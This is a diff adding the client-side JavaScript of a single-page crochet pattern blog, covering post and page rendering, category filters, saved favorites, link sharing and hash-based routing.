+                        <p style="margin-bottom:8px;"><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io" style="color:var(--primary);font-weight:600;">contact@carolynadamsulo-creator.github.io</a></p>
+                        <p style="margin-bottom:0;"><strong>Response Time:</strong> We typically respond to all crafting inquiries and correspondence within 24 to 48 business hours.</p>
+                    </div>
+
+                    <p>Feel free to tag us on social media when you finish any projects inspired by our patterns. We would love to celebrate your handmade creations!</p>
+                `
+            }
+        };
+
+        // 3. Application State and Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Crochet Accessories Studio";
+        const avatarUrl = "./assets/blog-avatar.png";
+
+        // Restore last-used category filter across post navigation
+        let currentCategory = sessionStorage.getItem('crochet_category') || 'all';
+        let likedPosts = JSON.parse(localStorage.getItem('crochet_liked_posts') || '{}');
+
+        // Compute estimated read time from HTML content word count
+        function getReadTime(content) {
+            const text = content.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
+            const words = text.split(' ').filter(w => w.length > 0).length;
+            const mins = Math.max(1, Math.round(words / 200));
+            return '⏱️ ' + mins + ' min read';
+        }
+
+        function toggleLike(e, postId) {
+            e.stopPropagation();
+            likedPosts[postId] = !likedPosts[postId];
+            localStorage.setItem('crochet_liked_posts', JSON.stringify(likedPosts));
+
+            const btn = document.getElementById('like-btn-' + postId);
+            if (btn) {
+                if (likedPosts[postId]) {
+                    btn.classList.add('active');
+                    btn.innerHTML = '❤️ Saved';
+                } else {
+                    btn.classList.remove('active');
+                    btn.innerHTML = '🤍 Save';
+                }
+            }
+            showToast(likedPosts[postId] ? 'Added to your favorites! ❤️' : 'Removed from favorites.');
+        }
+
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            if (toast) {
+                toast.innerText = message;
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 2500);
+            }
+        }
+
+        function sharePost(e, postId, title) {
+            e.stopPropagation();
+            const shareUrl = window.location.href.split('#')[0] + '#post/' + postId;
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(shareUrl).then(() => {
+                    showToast('Link copied to clipboard! 📋');
+                });
+            } else {
+                showToast('Article ready to share!');
+            }
+        }
+
+        function filterCategory(cat) {
+            currentCategory = cat;
+            sessionStorage.setItem('crochet_category', cat);
+            renderHome();
+        }
+
+        // Active navigation link updater
+        function updateNav(activeId) {
+            document.querySelectorAll('.top-nav a').forEach(a => a.classList.remove('active'));
+            const activeElem = document.getElementById('nav-' + activeId);
+            if (activeElem) {
+                activeElem.classList.add('active');
+            }
+        }
+
+        // Scroll Progress Bar Update
+        window.addEventListener('scroll', () => {
+            const progressBar = document.getElementById('progress-bar');
+            if (progressBar) {
+                const totalHeight = document.documentElement.scrollHeight - window.innerHeight;
+                if (totalHeight > 0) {
+                    const progress = (window.scrollY / totalHeight) * 100;
+                    progressBar.style.width = progress + '%';
+                } else {
+                    progressBar.style.width = '0%';
+                }
+            }
+        });
+
+        // Render Home View
+        function renderHome() {
+            updateNav('home');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+
+            const filteredPosts = currentCategory === 'all'
+                ? posts
+                : posts.filter(p => p.category.toLowerCase().includes(currentCategory.toLowerCase()));
+
+            let filterHtml = `
+                <div class="category-filter-bar">
+                    <button class="filter-btn ${currentCategory === 'all' ? 'active' : ''}" onclick="filterCategory('all')">All Patterns (${posts.length})</button>
+                    <button class="filter-btn ${currentCategory === 'animal' ? 'active' : ''}" onclick="filterCategory('animal')">Animal Wristwear</button>
+                    <button class="filter-btn ${currentCategory === 'jewelry' ? 'active' : ''}" onclick="filterCategory('jewelry')">Jewelry Bundles</button>
+                    <button class="filter-btn ${currentCategory === 'micro' ? 'active' : ''}" onclick="filterCategory('micro')">Micro Crochet</button>
+                    <button class="filter-btn ${currentCategory === 'vintage' ? 'active' : ''}" onclick="filterCategory('vintage')">Vintage Wearables</button>
+                    <button class="filter-btn ${currentCategory === 'keychain' ? 'active' : ''}" onclick="filterCategory('keychain')">Keychains &amp; Charms</button>
+                    <button class="filter-btn ${currentCategory === 'bow' ? 'active' : ''}" onclick="filterCategory('bow')">Bows &amp; Embellishments</button>
+                </div>
+            `;
+
+            let postsHtml = '';
+
+            if (filteredPosts.length === 0) {
+                postsHtml = `<div class="empty-state"><span class="empty-icon">🧶</span><h3>No patterns in this category yet</h3><p>Check back soon — new designs are always in the works!</p></div>`;
+                app.innerHTML = filterHtml + postsHtml;
+                return;
+            }
+
+            filteredPosts.forEach((post, index) => {
+                const isLiked = likedPosts[post.id];
+                postsHtml += `
+                    <article class="post-card" onclick="navigate('post', '${post.id}')" aria-label="${post.title}" style="animation-delay: ${index * 0.07}s">
+                        <div class="post-header">
+                            <div class="author-box">
+                                <img class="avatar" src="${avatarUrl}" alt="${blogUsername}" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1544816155-12df9643f363?w=100&auto=format&fit=crop&q=80'">
+                                <div class="author-info">
+                                    <span class="username">${blogUsername}</span>
+                                    <span class="sub-handle">Pattern Designer & Maker</span>
+                                </div>
+                            </div>
+                            <span class="category-pill">${post.category || 'Accessories'}</span>
+                        </div>
+                        <div class="post-image-container">
+                            <img class="post-image" src="${post.image}" alt="${post.title}" loading="lazy" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1606744837616-56c9a5c6a6eb?w=800&auto=format&fit=crop&q=80'">
+                        </div>
+                        <div class="post-content">
+                            <h2 class="post-title">${post.title}${post.isNew ? ' <span class="new-badge">New</span>' : ''}</h2>
+                            <p class="post-excerpt">${post.excerpt.replace(/\\n/g, '<br>')}</p>
+                        </div>
+                        <div class="post-footer">
+                            <div class="post-date-wrapper">
+                                <span>🗓️ ${post.date}</span>
+                                <span style="margin: 0 4px;">•</span>
+                                <span>${getReadTime(post.content)}</span>
+                            </div>
+                            <div class="post-actions">
+                                <button class="action-btn ${isLiked ? 'active' : ''}" id="like-btn-${post.id}" onclick="toggleLike(event, '${post.id}')">
+                                    ${isLiked ? '❤️ Saved' : '🤍 Save'}
+                                </button>
+                                <button class="action-btn" onclick="sharePost(event, '${post.id}', '${post.title.replace(/'/g, "\\'")}')" title="Share link">
+                                    🔗 Share
+                                </button>
+                            </div>
+                        </div>
+                    </article>
+                `;
+            });
+
+            app.innerHTML = filterHtml + postsHtml;
+        }
+
+        // Render Static Page
+        function renderPage(pageId) {
+            updateNav(pageId);
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `
+                    <div style="text-align: center; padding: 60px 20px;">
+                        <h2>Page Not Found</h2>
+                        <p style="color: var(--text-muted);">The page you are looking for does not exist.</p>
+                        <a class="back-button" onclick="navigate('home')">&larr; Return to Home</a>
+                    </div>
+                `;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Patterns & Articles</a>
+                <div class="single-post">
+                    <div class="page-header-box">
+                        <h1>${page.title}</h1>
+                    </div>
+                    <div class="page-body">
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Render Single Post
+        function renderPost(postId) {
+            updateNav('');
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `
+                    <div style="text-align: center; padding: 60px 20px;">
+                        <h2>Article Not Found</h2>
+                        <p style="color: var(--text-muted);">The requested pattern article could not be loaded.</p>
+                        <a class="back-button" onclick="navigate('home')">&larr; Return to Home</a>
+                    </div>
+                `;
+                return;
+            }
+
+            const isLiked = likedPosts[post.id];
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to All Patterns</a>
+                <article class="single-post">
+                    <div class="post-header">
+                        <div class="author-box">
+                            <img class="avatar" src="${avatarUrl}" alt="${blogUsername}">
+                            <div class="author-info">
+                                <span class="username">${blogUsername}</span>
+                                <span class="sub-handle">Pattern Designer & Maker</span>
+                            </div>
+                        </div>
+                        <span class="category-pill">${post.category || 'Accessories'}</span>
+                    </div>
+                    <div class="post-image-container">
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1606744837616-56c9a5c6a6eb?w=800&auto=format&fit=crop&q=80'">
+                    </div>
+                    <div class="post-content">
+                        <h1 class="post-title">${post.title}</h1>
+                        <div class="post-meta-bar">
+                            <span>🗓️ Published on ${post.date}</span>
+                            <span>•</span>
+                            <span>⏱️ Comprehensive Guide</span>
+                            <span>•</span>
+                            <span>🧶 Skill Level: All Makers</span>
+                        </div>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <div class="post-date-wrapper">
+                            <span>✨ Handcrafted with care by Crochet Accessories Studio</span>
+                        </div>
+                        <div class="post-actions">
+                            <button class="action-btn ${isLiked ? 'active' : ''}" id="like-btn-${post.id}" onclick="toggleLike(event, '${post.id}')">
+                                ${isLiked ? '❤️ Saved to Favorites' : '🤍 Save Pattern'}
+                            </button>
+                            <button class="action-btn" onclick="sharePost(event, '${post.id}', '${post.title.replace(/'/g, "\\'")}')">
+                                🔗 Share
+                            </button>
+                        </div>
+                    </div>
+                </article>
+            `;
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Router
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = 'post/' + id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = 'page/' + id;
+                renderPage(id);
+            }
+        }
+
+        // Route dispatcher based on hash
+        function handleRouting() {
+            const hash = window.location.hash.replace('#', '');
+            if (!hash) {
+                renderHome();
+                return;
+            }
+
+            if (hash.startsWith('page/')) {
+                const pageId = hash.replace('page/', '');
+                renderPage(pageId);
+            } else if (hash.startsWith('post/')) {
+                const postId = hash.replace('post/', '');
+                renderPost(postId);
+            } else if (pages[hash]) {
+                renderPage(hash);
+            } else {
+                const matchedPost = posts.find(p => p.id === hash);
+                if (matchedPost) {
+                    renderPost(hash);
+                } else {
+                    renderHome();
+                }
+            }
+        }
+
+        // Event Listeners
+        window.addEventListener('hashchange', handleRouting);
+        window.addEventListener('DOMContentLoaded', handleRouting);
+        handleRouting();
+    </script>
+</body>
+
+</html>
